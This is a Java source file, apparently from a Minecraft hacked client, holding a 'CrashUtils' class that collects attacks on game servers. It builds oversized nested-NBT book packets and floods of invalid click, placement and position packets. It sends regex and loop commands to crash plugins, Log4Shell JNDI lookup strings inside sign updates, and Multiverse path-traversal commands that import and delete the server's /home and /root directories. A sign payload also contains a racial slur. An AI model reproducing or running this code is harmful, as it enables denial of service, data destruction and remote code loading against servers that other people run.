package net.ccbluex.liquidbounce.utils;

import io.netty.buffer.Unpooled;
import net.ccbluex.liquidbounce.utils.ClientUtils;
import net.ccbluex.liquidbounce.utils.PacketUtils;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.*;
import net.minecraft.util.BlockPos;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.IChatComponent;
import org.apache.commons.lang3.RandomStringUtils;

import java.util.Random;
import java.util.concurrent.ThreadLocalRandom;

public class CrashUtils {

    public String[] unicode = {"م",
            "⾟", "✈", "龜", "樓", "ᳱ", "ᳩ", "ᳫ", "ᳬ", "᳭", "ᳮ", "ᳯ", "ᳰ", "⿓", "⿕",
            "⿔", "\uD803\uDE60", "\uD803\uDE65", "ᮚ", "ꩶ", "꩷", "㉄", "Ὦ", "Ἇ", "ꬱ",
            "ꭑ", "ꭐ", "\uAB67", "ɸ", "Ａ", "\u007F"}; //31

    public String lpx = "...................................................Ѳ2.6602355499702653E8"; //12;

    public String netty = ".........................................................................................................................." +
            "..........................................................................................................................................." +
            "..........................................................................................................................................." +
            "..........................................................................................................................................." +
            "............................................................................................................................................" +
            "..........................................................................................................................................." +
            "..........................................................................................................................................." +
            "..........................................................................................................................................." +
            "............................................................................................................................................." +
            "............................................................................................................................................." +
            "............................................................................................................................................." +
            "..............................................................................................................................................." +
            ".............................................................................................................................................." +
            "....................................................................................................................................................."; //12
    public String pexcrashexp1 = "/pex promote a a";
    public String pexcrashexp2 = "/pex promote b b";
    public String mv = "/Mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^";
    public String fawe = "/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}";
    public String pdw = "{\"petya.exe\":\"${jndi:rmi://du.pa}\"}}";
    public String pdw2 = "{\"petya.exe\":\"${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}${jndi:rmi://google.com/a}\"}}";
    public String[] oldmv = {"/mv import ../../../../../home normal -t flat",
            "/mv import ../../../../../root normal -t flat",
            "/mv delete ../../../../../home",
            "/mv confirm",
            "/mv delete ../../../../../root",
            "/mv confirm"};
    String[] buffertype = {"MC|BSign", "MC|BEdit"};

    public String AlphabeticRandom(int count) {
        return RandomStringUtils.randomAlphabetic(count);
    }

    public String NumberRandom(int count) {
        return RandomStringUtils.randomNumeric(count);
    }

    public String AsciirRandom(int count) {
        return RandomStringUtils.randomAscii(count);
    }

    public void oneBlockCrash(ItemStack stack) {
        PacketUtils.INSTANCE.sendPacketNoEvent(new C08PacketPlayerBlockPlacement
                (new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - new Random().nextFloat() - 1.0f, Minecraft.getMinecraft().thePlayer.posZ)
                        , new Random().nextInt(255), stack, 0.0f, 0.0f, 0.0f));
    }

    public void payload1(ItemStack stack) {
        PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
        packetBuffer.writeItemStackToBuffer(stack);
        PacketUtils.INSTANCE.sendPacketNoEvent(new C17PacketCustomPayload("MC|BEdit", packetBuffer));
    }

    public void payload2(ItemStack stack) {
        PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
        packetBuffer.writeItemStackToBuffer(stack);
        PacketUtils.INSTANCE.sendPacketNoEvent(new C17PacketCustomPayload(buffertype[ThreadLocalRandom.current().nextInt(1)], packetBuffer));
    }

    public void creatandpayload(ItemStack stack) {
        PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
        packetBuffer.writeItemStackToBuffer(stack);
        PacketUtils.INSTANCE.sendPacketNoEvent(new C10PacketCreativeInventoryAction(0, stack));
        PacketUtils.INSTANCE.sendPacketNoEvent(new C17PacketCustomPayload("MC|BEdit", packetBuffer));
    }

    public void creatandplace(ItemStack stack) {
        PacketUtils.INSTANCE.sendPacketNoEvent(new C10PacketCreativeInventoryAction(0, stack));
        PacketUtils.INSTANCE.sendPacketNoEvent((new C08PacketPlayerBlockPlacement
                (new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - new Random().nextFloat() - 1.0f, Minecraft.getMinecraft().thePlayer.posZ)
                        , new Random().nextInt(255), stack, 0.0f, 0.0f, 0.0f)));
    }

    public void click(ItemStack stack) {
        PacketUtils.INSTANCE.sendPacketNoEvent(new C0EPacketClickWindow
                (0, Integer.MIN_VALUE, 0, 0, stack, (short) 0));
    }

    public void creatandclick(ItemStack stack) {
        PacketUtils.INSTANCE.sendPacketNoEvent(new C10PacketCreativeInventoryAction(Integer.MIN_VALUE, stack));
        PacketUtils.INSTANCE.sendPacketNoEvent(new C0EPacketClickWindow(0, Integer.MIN_VALUE, 0, 3, stack, (short) 0));
    }

    public void justcreate(ItemStack stack) {
        PacketUtils.INSTANCE.sendPacketNoEvent(new C10PacketCreativeInventoryAction
                (-999, stack));
    }

    public void custombyte(int amount) {
        double x = Minecraft.getMinecraft().thePlayer.posX, y = Minecraft.getMinecraft().thePlayer.posY, z = Minecraft.getMinecraft().thePlayer.posZ;
        for (int j = 0; j < amount; j++) {
            double i = ThreadLocalRandom.current().nextDouble(0.4, 1.2);
            if (y > 255) y = 255;
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y, z, false));
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y, z, true));
        }
    }

    public void testCrash(String CrashType, int value) {
        try {
            switch (CrashType.toLowerCase()) {
                case "pex": //Pex (outdated)
                    PacketUtils.INSTANCE.sendPacketNoEvent(new C01PacketChatMessage(pexcrashexp1));
                    PacketUtils.INSTANCE.sendPacketNoEvent(new C01PacketChatMessage(pexcrashexp2));
                    break;
                case "fawe": //Old Fawe  (outdated)
                    PacketUtils.INSTANCE.sendPacketNoEvent(new C01PacketChatMessage(fawe));
                    break;
                case "mv": //Mv (outdated)
                    PacketUtils.INSTANCE.sendPacketNoEvent(new C01PacketChatMessage(mv));
                    break;
                case "position":
                    custombyte(value);
                    break;
                case "rsc1":
                    IChatComponent[] iTextComponentArray = new IChatComponent[]{new ChatComponentText(""), new ChatComponentText(""), new ChatComponentText(""), new ChatComponentText("")};
                    iTextComponentArray[0] = new ChatComponentText(pdw);
                    PacketUtils.INSTANCE.sendPacketNoEvent(new C12PacketUpdateSign(BlockPos.ORIGIN, iTextComponentArray));
                    break;
                case "rsc2":
                    PacketUtils.INSTANCE.sendPacketNoEvent(new C12PacketUpdateSign(BlockPos.ORIGIN,
                            new IChatComponent[]{new ChatComponentText(pdw2), new ChatComponentText("nigga"), new ChatComponentText("doyoulovemekid"), new ChatComponentText("ezmyfriend")}));
                    break;
                case "netty":
                    crashdemo("a", 0, 1500, 5, false, CrashUtils.CrashType.PLACE, value);
                    break;
                default:
                    ClientUtils.INSTANCE.displayChatMessage("Couldn't Find the Crash Type");
            }
        } catch (Exception e) {

        }
    }

    public void crashdemo(String sign, int booktype, int bookvalue, int redo, boolean customedit, CrashType type, int amount) {
        int size;
        NBTTagCompound compound = new NBTTagCompound();
        NBTTagList tagList = new NBTTagList();
        StringBuilder builder = new StringBuilder();

        Item hold;

        switch (booktype) {
            case 0:
                hold = Items.writable_book;
                break;
            case 1:
                hold = Items.book;
                break;
            case 2:
            default:
                hold = Items.written_book;
        }

        if (customedit) {
            builder.append(sign);
        } else {
            builder.append("{");
            for (size = 0; size < bookvalue; ++size) {
                builder.append("extra:[{");
            }
            for (size = 0; size < bookvalue; ++size) {
                builder.append("text:").append(sign).append("}],");
            }
            builder.append("text:").append(sign).append("}");
        }
        for (size = 0; size < redo; ++size)
            tagList.appendTag(new NBTTagString(builder.toString()));

        compound.setString("author", Minecraft.getMinecraft().getSession().getUsername());
        compound.setString("title", "Hanabi" + AlphabeticRandom(5));
        compound.setByte("resolved", (byte) 1);
        compound.setTag("pages", tagList);


        ItemStack stack = new ItemStack(hold);
        stack.setTagCompound(compound);

        int packet = 0;

        while (packet++ < amount) {
            switch (type) {
                case PLACE:
                    oneBlockCrash(stack);
                    break;
                case CLICK:
                    click(stack);
                    break;
                case PAYLOAD1:
                    payload1(stack);
                    break;
                case PAYLOAD2:
                    payload2(stack);
                    break;
                case CAP:
                    creatandplace(stack);
                    break;
                case CAC:
                    creatandclick(stack);
                    break;
                case CAPL:
                    creatandpayload(stack);
                    break;
                case CREATE:
                    justcreate(stack);
                    break;
            }
        }
    }


    public enum CrashType {
        PLACE, CLICK, PAYLOAD1, PAYLOAD2, CAP, CAC, CAPL, CREATE
    }


    //TODO: GUI For Crasher // Netty Crasher // Non - Burst Crasher // Multi Tags Crasher // Non Book Make Crasher
    //PlayerUtil.debug(Hanabi.INSTANCE.aesUtil.AESEncode(String.valueOf(packetBuffer))); Thread.sleep(delay);


}